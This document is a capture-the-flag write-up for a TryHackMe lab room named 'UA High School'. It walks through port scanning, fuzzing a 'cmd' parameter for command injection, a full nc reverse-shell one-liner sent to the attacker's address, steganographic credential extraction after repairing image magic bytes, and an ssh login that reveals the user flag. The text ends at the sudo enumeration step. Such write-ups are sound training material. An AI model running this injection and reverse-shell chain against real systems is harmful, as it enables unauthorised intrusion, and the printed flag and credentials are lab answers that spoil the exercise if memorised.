# THM ROOM - UA High School

## RECONNAISSANCE

### Nmap

```
└──╼ $nmap -sV -Pn 10.10.68.219
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-26 20:33 PKT
Nmap scan report for 10.10.68.219
Host is up (0.43s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE  VERSION
22/tcp   open     ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http     Apache httpd 2.4.41 ((Ubuntu))
2021/tcp filtered servexec
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.04 seconds
```

Open ports:
- 22: ssh
- 80: http

There must be an web application running on the server.

Directories traversal:
- /assets/
  - /assets/index.php

Let's check for command injection vulnerability, first we'll install a tool `fuff` and for that you need to have `go` cli tool installed. To install `fuff` run the following command

```
$ go install github.com/ffuf/ffuf/v2@latest
```

Now let's also get some wordlists:

```
$ git clone https://github.com/danielmiessler/SecLists.git
```

Now that we have everything, let's run the tool:

```
$~/go/bin/ffuf -u 'http://10.10.216.120/assets/index.php?FUZZ=id' -mc all -ic -t 100 -w /home/hamza/Utilities/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.216.120/assets/index.php?FUZZ=id
 :: Wordlist         : FUZZ: /home/hamza/Utilities/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: all
 :: Filter           : Response size: 0
________________________________________________

cmd                     [Status: 200, Size: 72, Words: 1, Lines: 1, Duration: 508ms]
:: Progress: [38267/38267] :: Job [1/1] :: 195 req/sec :: Duration: [0:03:16] :: Errors: 0 ::
```

Hence, url `http://10.10.183.152/assets/index.php` contains command injection vulnerability, bu passing command in the `cmd` param in the url. 

Try getting response of a command, example `whoami`:

```
$ curl -s  'http://10.10.183.152/assets/index.php?cmd=whoami'
d3d3LWRhdGEK
```
Output is in base64 format, then let rerun the command and decode the output as well:

```
$ curl -s  'http://10.10.183.152/assets/index.php?cmd=whoami' | base64 -d
www-data
```

As you can see we are able to run commands as user ***www-data***

Now let's try to get a reverse shell.

```
nc -lvnp 5555
```

https://www.revshells.com/


Taking reverse shell with curl:
```
$ curl -s 'http://10.10.236.132/assets/index.php' -G --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.4.93.55 5555 >/tmp/f'
```

On the other terminal window, shell has been initiated:
```
$nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.4.93.55] from (UNKNOWN) [10.10.236.132] 34472
bash: cannot set terminal process group (751): Inappropriate ioctl for device
bash: no job control in this shell
www-data@myheroacademia:/var/www/html/assets$ g
```

Let's look for all the files and directories that our user `www-data`.

```
$ find / -user www-data
```

Most of the items were useless but some are worth noticing:

```
...
/var/www
/var/www/html
/var/www/html/assets
/var/www/html/assets/images
/var/www/html/assets/images/yuei.jpg
/var/www/html/assets/images/oneforall.jpg
/var/www/html/assets/index.php
/var/www/html/index.html
/var/www/html/about.html
/var/www/html/admissions.html
/var/www/html/contact.html
/var/www/html/courses.html
/var/www/Hidden_Content
/var/www/Hidden_Content/passphrase.txt
...
```

In the list, you can see there are three file out of all the other mentions that we should investigate:
- /var/www/html/assets/images/yuei.jpg
- /var/www/html/assets/images/oneforall.jpg
- /var/www/Hidden_Content/passphrase.txt

Let's go first with the **passphrase.txt**.

```
cat /var/www/Hidden_Content/passphrase.txt
QWxsbWlnaHRGb3JFdmVyISEhCg==
```

We got something!!

It's in base64 so we can just decode it retrieve the clear text.

```
$echo QWxsbWlnaHRGb3JFdmVyISEhCg== | base64 -d
AllmightForEver!!!
```
So, lookslike a password, but for which user?

Let's explore other files as well, that we got while enumerating. First lets just download both of them.

```
$ wget 'http://10.10.236.132/assets/images/yuei.jpg'
...

$ wget 'http://10.10.236.132/assets/images/oneforall.jpg'
...
```
Amoung both the images, `yuei.jpg` seems to be the normal image file and it also being used on the site, but the other image is neither used or nor it's being opened, which is a bit suspicious.

And by suspicious, I mean it might not be a image file, so we will go and try extract data through stegnography and for that we will use the tool **"steghide"**.

```
$steghide extract -sf oneforall.jpg 
Enter passphrase: 
steghide: the file format of the file "oneforall.jpg" is not supported.
```

Although steghide supports jpeg images but this error indicates that the image is not in jpeg format, we can examine thorugh hex dumps, run the following command lets see what it gives:

```
$ xxd oneforall.jpg | head
00000000: 8950 4e47 0d0a 1a0a 0000 0001 0100 0001  .PNG............
00000010: 0001 0000 ffdb 0043 0006 0405 0605 0406  .......C........
00000020: 0605 0607 0706 080a 100a 0a09 090a 140e  ................
00000030: 0f0c 1017 1418 1817 1416 161a 1d25 1f1a  .............%..
00000040: 1b23 1c16 1620 2c20 2326 2729 2a29 191f  .#... , #&')*)..
00000050: 2d30 2d28 3025 2829 28ff db00 4301 0707  -0-(0%()(...C...
00000060: 070a 080a 130a 0a13 281a 161a 2828 2828  ........(...((((
00000070: 2828 2828 2828 2828 2828 2828 2828 2828  ((((((((((((((((
00000080: 2828 2828 2828 2828 2828 2828 2828 2828  ((((((((((((((((
00000090: 2828 2828 2828 2828 2828 2828 2828 ffc0  ((((((((((((((..
```

In the first line `8950 4e47 0d0a 1a0a` are clearly indicating it is a PNG file
```
00000000: 8950 4e47 0d0a 1a0a 0000 0001 0100 0001  .PNG............
```

These are called Magic bytes.
- For PNG: `89 50 4E 47 0D 0A 1A 0A`
- For JPG: `FF D8 FF E0 00 10 4A 46 49 46 00 01`

Therefore, if we can just edit these bytes for JPG, we will be able to proceed with data extraction. For this we will use `hexcurse`.

```
$ hexcurse -i oneforall.jpg 
```

It's easy to use tool, just change the header bytes as mentioned above and you will get it like this:

```
$xxd oneforall.jpg | head
00000000: ffd8 ffe0 0010 4a46 4946 0001 0100 0001  ......JFIF......
00000010: 0001 0000 ffdb 0043 0006 0405 0605 0406  .......C........
00000020: 0605 0607 0706 080a 100a 0a09 090a 140e  ................
00000030: 0f0c 1017 1418 1817 1416 161a 1d25 1f1a  .............%..
00000040: 1b23 1c16 1620 2c20 2326 2729 2a29 191f  .#... , #&')*)..
00000050: 2d30 2d28 3025 2829 28ff db00 4301 0707  -0-(0%()(...C...
00000060: 070a 080a 130a 0a13 281a 161a 2828 2828  ........(...((((
00000070: 2828 2828 2828 2828 2828 2828 2828 2828  ((((((((((((((((
00000080: 2828 2828 2828 2828 2828 2828 2828 2828  ((((((((((((((((
00000090: 2828 2828 2828 2828 2828 2828 2828 ffc0  ((((((((((((((..
```

As you can see the head is changed. Now let's try and extract data again:

```
$steghide extract -sf oneforall.jpg 
Enter passphrase: 
```

Provide the passphrase we got earlier above, you will get the following response:

```
wrote extracted data to "creds.txt"
```

Print the file and you can now review the credentials:

```
$ cat creds.txt 
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:One?For?All_!!one1/A
```

Let's login as deku and get our first flag.

```
$ ssh deku@10.10.236.132
The authenticity of host '10.10.236.132 (10.10.236.132)' can't be established.
ED25519 key fingerprint is SHA256:OgRmqdwC/bY0nCsZ5+MHrpGGo75F1+78/LGZjSVg2VY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.236.132' (ED25519) to the list of known hosts.
deku@10.10.236.132's password: 

...
...

deku@myheroacademia:~$ ls
user.txt

deku@myheroacademia:~$ cat user.txt 
THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
```
Next target, root user.

```
deku@myheroacademia:~$ sudo -l
[sudo] password for deku: 
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh

deku@myheroacademia:~$ ls -l /opt/NewComponent/feedback.sh 
-r-xr-xr-x 1 deku deku 684 Jan 23  2024 /opt/NewComponent/feedback.sh

```


